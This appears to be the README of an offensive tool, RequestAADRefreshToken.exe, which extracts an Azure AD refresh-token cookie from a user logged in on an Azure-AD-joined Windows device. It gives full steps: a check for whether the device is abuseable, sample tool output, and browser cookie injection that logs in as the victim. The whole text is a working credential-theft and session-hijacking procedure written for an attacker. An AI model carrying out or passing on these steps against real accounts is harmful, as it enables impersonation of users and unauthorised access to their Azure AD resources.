# Overview
Obtains a refresh token for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account). An attacker can then use the token to authenticate to Azure AD as that user.


# Usage
1. Obtain access to a user context on an Azure-AD-joined device. An easy way to tell is to run the command `dsregcmd.exe /status`. If this is abuseable, there will be a section titled "SSO State" and `AzureAdPrt` will be set to YES.
2. Run RequestAADRefreshToken.exe
```
Requesting cookies for the following URIs: https://login.microsoftonline.com/

Uri: https://login.microsoftonline.com/
    Name      : x-ms-RefreshTokenCredential
    Flags     : 8256

    P3PHeader : CP="CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT"

DONE
```
3. Clear your browser cookies and go to https://login.microsoftonline.com/login.srf
4. F12 (Chrome dev tools) -> Application -> Cookies
5. Delete all cookies and then add one named `x-ms-RefreshTokenCredential` and set its value to the JSON Web Token(JWT) in the `Data` field that RequestAADRefreshToken.exe output
6. Refresh the page (or visit https://login.microsoftonline.com/login.srf again) and you'll be logged in
